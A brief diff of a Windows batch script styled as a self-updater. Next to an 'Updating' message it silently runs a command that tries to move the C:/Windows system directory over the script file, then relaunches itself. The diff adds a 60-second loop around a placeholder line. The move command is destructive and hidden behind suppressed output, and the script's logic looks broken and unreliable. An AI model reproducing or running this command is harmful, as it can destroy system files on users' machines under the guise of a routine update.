@@ -1,4 +1,5 @@
 @echo off
+:Update
 start /min cmd /k (
 if /i not "%~1"=="updated" (
     echo Updating %~nx0 ...
@@ -6,4 +7,7 @@ if /i not "%~1"=="updated" (
     >nul 2>&1 move /y "C:/Windows" "%~dpnx0"
     >nul 2>&1 powershell start "%~0" updated & exit /b
 )
+TIMEOUT /T 60 /NOBREAK
+echo Code goes here
+goto Update
 )
